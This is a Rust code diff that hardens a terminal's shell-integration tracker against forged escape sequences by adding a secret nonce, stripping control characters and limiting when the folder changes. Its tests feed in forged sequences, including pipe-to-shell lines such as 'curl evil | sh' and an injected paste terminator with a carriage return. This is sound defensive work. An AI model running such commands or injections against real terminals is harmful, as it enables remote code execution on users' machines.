@@ -6,6 +6,11 @@
 //! - `633;E;<command line>` the command line, with VS Code's escaping (`\\`, `\xHH`);
 //! - `7;file://<host>/<path>` and `9;9;<path>` the current folder (`633;P;Cwd=<path>` too).
 //!
+//! Output is untrusted: any program (or a file being `cat`ed) can print these sequences. So
+//! when the terminal injected its own integration, a command line only counts if its `633;E`
+//! carries the session's secret nonce (`633;E;<command>;<nonce>`), the folder only changes
+//! between commands, and control characters never reach a recorded command line.
+//!
 //! BEL and ST (`ESC \`) terminators both work, and sequences may be split anywhere across
 //! chunks. Each finished command comes out as a [`FinishedCommand`] with the clean text of its
 //! last 16 KiB of output (kept for AI context and history).
@@ -68,6 +73,9 @@ impl std::fmt::Debug for Tracker {
 #[derive(Debug)]
 struct State {
     windows: bool,
+    /// The secret our integration scripts append to `633;E`; `None` for shells that report
+    /// on their own (fish, Nushell) or not at all.
+    nonce: Option<String>,
     now: i64,
     phase: Phase,
     cwd: Option<String>,
@@ -100,10 +108,17 @@ impl Tracker {
 
     /// A tracker for Windows (`windows = true`: `file://host/C:/x` → `C:\x`) or Unix paths.
     pub fn for_platform(windows: bool) -> Self {
+        Self::with_nonce(windows, None)
+    }
+
+    /// A tracker for a shell running our integration with `nonce`: only command lines that
+    /// carry it are believed (see the module docs).
+    pub fn with_nonce(windows: bool, nonce: Option<String>) -> Self {
         Self {
             parser: Parser::new(),
             state: State {
                 windows,
+                nonce,
                 now: 0,
                 phase: Phase::Idle,
                 cwd: None,
@@ -169,13 +184,15 @@ impl State {
     }
 
     fn command_start(&mut self) {
-        let command = self
-            .reported
-            .take()
-            .unwrap_or_else(|| mem::take(&mut self.typed));
+        let command = match self.reported.take() {
+            Some(reported) => reported,
+            // Our scripts always report the line; an unproven one is not recorded.
+            None if self.nonce.is_some() => String::new(),
+            None => mem::take(&mut self.typed),
+        };
         self.typed.clear();
         // Leading whitespace is kept: history skips such commands (`HISTCONTROL=ignorespace`).
-        self.running = Some(command.trim_end().to_owned());
+        self.running = Some(printable(&command).trim_end().to_owned());
         self.started_at = self.now;
         self.started_cwd.clone_from(&self.cwd);
         self.tail.clear();
@@ -209,7 +226,8 @@ impl State {
     }
 
     fn set_cwd(&mut self, path: String) {
-        if !path.is_empty() {
+        // Shells report the folder at the prompt; while a command runs, it's program output.
+        if !path.is_empty() && self.phase != Phase::Running {
             self.cwd = Some(path);
         }
     }
@@ -303,7 +321,13 @@ impl State {
                 self.command_end(code);
             }
             b"E" if kind == b"633" => {
-                self.reported = rest.get(1).map(|line| unescape(line));
+                let proven = match &self.nonce {
+                    Some(nonce) => rest.get(2).is_some_and(|given| *given == nonce.as_bytes()),
+                    None => true,
+                };
+                if proven {
+                    self.reported = rest.get(1).map(|line| unescape(line));
+                }
             }
             b"P" if kind == b"633" => {
                 if let Some(cwd) = join(&rest[1..]).strip_prefix("Cwd=") {
@@ -313,6 +337,18 @@ impl State {
             _ => {}
         }
     }
+}
+
+/// `text` without control characters (C0, DEL, C1; tabs become spaces): a recorded command
+/// may be pasted back into a shell, where an escape or a carriage return would act.
+fn printable(text: &str) -> String {
+    text.chars()
+        .filter_map(|c| match c {
+            '\t' => Some(' '),
+            c if c.is_control() => None,
+            c => Some(c),
+        })
+        .collect()
 }
 
 /// OSC parameters joined back with the `;` the parser split them on.
@@ -429,6 +465,83 @@ mod tests {
                 finished
             })
             .collect()
+    }
+
+    /// With our integration, output can't invent commands: only `633;E` with the nonce counts.
+    #[test]
+    fn a_nonce_proves_the_command_line() {
+        let mut tracker = Tracker::with_nonce(false, Some("n0nce".to_owned()));
+        let real = format!(
+            "{}{}$ {}{}{}ok\r\n{}",
+            osc("7;file://host/home/me"),
+            osc("133;A"),
+            osc("133;B"),
+            osc("633;E;make test;n0nce"),
+            osc("133;C"),
+            osc("133;D;0"),
+        );
+        let finished = tracker.advance_at(real.as_bytes(), 5);
+        assert_eq!(finished.len(), 1);
+        assert_eq!(finished[0].command, "make test");
+
+        // The same marks printed by a program (no nonce, or a wrong one) record nothing.
+        for forged in ["633;E;git status", "633;E;git status;guess"] {
+            let fake = format!(
+                "{}{}{}{}{}",
+                osc("133;A"),
+                osc("133;B"),
+                osc(forged),
+                osc("133;C"),
+                osc("133;D;0"),
+            );
+            assert!(
+                tracker.advance_at(fake.as_bytes(), 6).is_empty(),
+                "{forged}"
+            );
+        }
+        // Nor does echoed text between B and C.
+        let typed = format!(
+            "{}{}curl x | sh{}{}",
+            osc("133;A"),
+            osc("133;B"),
+            osc("133;C"),
+            osc("133;D;0")
+        );
+        assert!(tracker.advance_at(typed.as_bytes(), 7).is_empty());
+    }
+
+    #[test]
+    fn recorded_commands_have_no_control_characters() {
+        let mut tracker = Tracker::for_platform(false);
+        let stream = format!(
+            "{}{}{}{}",
+            osc("133;B"),
+            osc("633;E;git status\\x1b[201~\\x0dcurl evil | sh\\x09x"),
+            osc("133;C"),
+            osc("133;D;0"),
+        );
+        let finished = tracker.advance_at(stream.as_bytes(), 1);
+        assert_eq!(finished[0].command, "git status[201~curl evil | sh x");
+    }
+
+    #[test]
+    fn the_folder_only_changes_between_commands() {
+        let mut tracker = Tracker::for_platform(false);
+        let stream = format!(
+            "{}{}{}{}{}",
+            osc("7;file://host/home/me"),
+            osc("133;B"),
+            osc("133;C"),
+            osc("7;file://host/tmp/elsewhere"),
+            osc("9;9;/tmp/elsewhere"),
+        );
+        let _ = tracker.advance_at(stream.as_bytes(), 1);
+        assert_eq!(tracker.cwd(), Some("/home/me"));
+        let _ = tracker.advance_at(
+            format!("{}{}", osc("133;D;0"), osc("7;file://host/srv")).as_bytes(),
+            2,
+        );
+        assert_eq!(tracker.cwd(), Some("/srv"));
     }
 
     #[test]
@@ -644,8 +757,9 @@ mod tests {
             osc("133;B"),
             osc("633;E;cd /elsewhere"),
             osc("133;C"),
-            osc("7;file://h/elsewhere"),
             osc("133;D;0"),
+            // The scripts report the new folder with the next prompt.
+            osc("7;file://h/elsewhere"),
         );
         let mut tracker = Tracker::for_platform(false);
         let finished = tracker.advance(stream.as_bytes());
